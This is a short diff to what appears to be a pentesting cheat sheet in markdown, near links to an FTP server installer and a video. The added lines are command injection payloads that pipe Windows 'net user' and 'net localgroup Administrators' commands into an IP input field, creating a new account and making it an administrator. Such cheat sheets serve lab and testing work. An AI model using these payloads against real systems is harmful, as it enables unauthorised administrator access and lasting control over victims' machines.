@@ -442,4 +442,9 @@ python -m SimpleHTTPServer
 [FTP Server](https://archive.org/download/file-zilla-server-0-9-5/FileZilla_Server_0_9_5.exe) 
   
 [YOUTUBE](https://www.youtube.com/watch?v=_4a4qSaIIrw)
+  
+> Command Injection ( IP| net user Test_user /Add )
+  (| net user)
+  (| net localgroup Administrators Test_user /Add)
+  
 </details>
